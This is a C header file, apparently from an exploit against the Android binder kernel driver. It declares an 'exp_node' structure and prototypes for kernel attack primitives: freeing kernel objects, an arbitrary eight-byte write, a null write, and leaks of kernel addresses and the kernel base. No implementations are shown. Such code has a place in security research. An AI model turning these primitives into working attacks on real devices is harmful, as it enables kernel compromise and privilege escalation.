#ifndef NODE_H_
#define NODE_H_
#include <stdint.h>
#include <stdbool.h>

#include "binder.h"
#include "pending_node.h"

struct exp_node {
	struct binder_state *bs;
	uint64_t handle;
	const char *endpoint_name;
   uint8_t name[16];
	uint64_t vma_start;
	bool second;
	pthread_t *th;
	int idx;
   int max;
   struct pending_node *pending_nodes;
   int num_pending;
	uint64_t addr;
   uint64_t kaddr;
	int target_fd;
	uint64_t file_addr;
	int ep_fd;
	pid_t tid;
};

/* exp_node API. */

struct exp_node *node_new(const char *name);
void node_free(struct exp_node *node);
bool node_reset(struct exp_node *node);

/* This are the kernel related operations. */
void node_kfree(struct exp_node *node);
bool node_realloc_content(struct exp_node *node, void *data, size_t size);
bool node_write8(struct exp_node *node, uint64_t what, uint64_t where);
bool node_write_null(struct exp_node *node, uint64_t where);


bool node_realloc(struct exp_node *node, void *content, size_t size);
struct exp_node *node_create(uint8_t *endpoint_name, int target_fd);
static struct exp_node *_node_create(uint8_t *endpoint_name, int target_fd);
void node_destroy(struct exp_node *node);
bool node_leak(struct exp_node *node, uint64_t *A, uint64_t *B);
bool node_leak_addr_and_kbase(struct exp_node *node, uint64_t *text);
#endif /*! NODE_H_ */
